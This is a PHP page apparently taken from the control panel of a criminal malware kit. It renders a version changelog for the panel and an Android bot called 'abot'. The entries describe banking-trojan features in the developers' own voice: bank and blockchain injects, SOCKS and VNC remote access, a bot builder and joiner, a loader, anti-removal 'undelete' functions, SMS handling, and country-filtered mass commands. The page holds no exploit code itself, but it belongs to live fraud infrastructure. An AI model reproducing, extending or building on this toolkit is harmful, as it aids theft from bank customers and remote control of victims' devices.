<?php
	include "config.php";
	
	print_header();
	
	print_menu();
	
	$html = " ";

$html .= "
<strong>[panel] v.0.4.5</strong>
&emsp; * add ыsocks and vnc support
&emsp; * other fix

<strong>[abot] v.0.1.6</strong>
&emsp; * add start landing page for banks injects and comparing
&emsp; * fix bugs

<strong>[panel] v.0.4.4</strong>
&emsp; * add configured builder
&emsp; * other fix

<strong>[panel] v.0.4.3</strong>
&emsp; * fix breadscrumbs
&emsp; * fix filemanager
&emsp; * fix styles
&emsp; * fix database button
&emsp; * other fix

<strong>[abot] v.0.1.5</strong>
&emsp; * add system parameter in knock
&emsp; * fix bugs

<strong>[panel] v.0.4.2</strong>
&emsp; * add parameter in bot ( for install apk )
&emsp; * other fix

<strong>[panel] v.0.4.1</strong>
&emsp; * add country flags
&emsp; * other fix


<strong>[panel] v.0.4.0</strong>
&emsp; * optimizate and fix cron
&emsp; * optimizate and fix gate
&emsp; * other fix

<strong>[panel] v.0.3.9</strong>
&emsp; * fix injects module
&emsp; * add blockchain inject
&emsp; * fix sms lenght in bot windows
&emsp; * add edit button in auto commands
&emsp; * add search in apps lists
&emsp; * fix bugs

<strong>[abot] v.0.1.4</strong>
&emsp; * fix install system module
&emsp; * fix bugs

<strong>[panel] v.0.3.8</strong>
&emsp; * fix autocommands
&emsp; * fix bugs

<strong>[abot] v.0.1.3</strong>
&emsp; * fix big BUG :) now app work on all android 5++
&emsp; * fix bugs

<strong>[panel] v.0.3.7</strong>
&emsp; * add country filter in mass commands
&emsp; * add core filter in mass commands
&emsp; * fix bugs

<strong>[panel] v.0.3.6</strong>
&emsp; * add cron
&emsp; * add mass commands
&emsp; * fix tables
&emsp; * fix bugs

<strong>[panel] v.0.3.5</strong>
&emsp; * add type GP loader
&emsp; * change style bots
&emsp; * add filter bot loader GP
&emsp; * fix bugs

<strong>[panel] v.0.3.4</strong>
&emsp; * change support jabber in help
&emsp; * fix bugs

<strong>[abot] v.0.1.2</strong>
&emsp; * fix loader
&emsp; * fix undelete functions
&emsp; * fix bugs

<strong>[panel] v.0.3.2</strong>
&emsp; * fix loader url functios
&emsp; * fix bugs

<strong>[abot] v.0.1.1</strong>
&emsp; * fix undelete system
&emsp; * fix bugs

<strong>[panel] v.0.3.2</strong>
&emsp; * change settings optios
&emsp; * add builder in menu
&emsp; * add joiner
&emsp; * fix bugs

<strong>[panel] v.0.3.1</strong>
&emsp; * add build params for win bot
&emsp; * add builder configs
&emsp; * fix bugs

<strong>[panel] v.0.3.0</strong>
&emsp; * add build params for yours bot
&emsp; * fix bugs

<strong>[panel] v.0.2.9</strong>
&emsp; * add params to user
&emsp; * add keywords for automatics sort bot after knock
&emsp; * fix notifications
&emsp; * fix bugs

<strong>[panel] v.0.2.8</strong>
&emsp; * add notification to jabber and panel
&emsp; * add faq
&emsp; * fix bugs
";

	print_content("Changelog",nl2br($html));
	
	print_footer();

?>
